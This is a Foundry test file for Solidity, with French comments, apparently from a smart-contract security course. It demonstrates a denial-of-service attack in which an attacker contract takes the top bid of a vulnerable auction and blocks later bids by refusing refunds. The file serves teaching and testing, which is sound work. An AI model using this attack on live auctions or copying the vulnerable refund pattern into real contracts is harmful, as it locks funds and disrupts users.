// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {VulnerableAuction} from "../../src/06-dos/VulnerableAuction.sol";
import {Attacker} from "../../src/06-dos/Attacker.sol";

contract DoSTest is Test {
    VulnerableAuction auction;
    Attacker attacker;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        auction = new VulnerableAuction();
        attacker = new Attacker(address(auction));

        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
        vm.deal(address(this), 10 ether);
    }

    /// Cas normal : sans attaquant, l'enchère fonctionne et Alice est remboursée.
    function test_NormalAuction_Works() public {
        vm.prank(alice);
        auction.bid{value: 1 ether}();

        vm.prank(bob);
        auction.bid{value: 2 ether}();

        assertEq(auction.highestBidder(), bob);
        assertEq(alice.balance, 10 ether); // Alice a récupéré son offre
    }

    /// Exploit : l'attaquant bloque l'enchère, Bob ne peut plus enchérir.
    function test_DoS_BlocksAuction() public {
        // 1. L'attaquant prend la tête avec 1 ETH
        attacker.attack{value: 1 ether}();
        assertEq(auction.highestBidder(), address(attacker));

        // 2. Bob offre plus, mais la transaction ECHOUE (remboursement refusé)
        vm.prank(bob);
        vm.expectRevert("Remboursement echoue");
        auction.bid{value: 2 ether}();

        // 3. L'attaquant est toujours en tête : l'enchère est bloquée
        assertEq(auction.highestBidder(), address(attacker));
        assertEq(auction.highestBid(), 1 ether);
    }
}
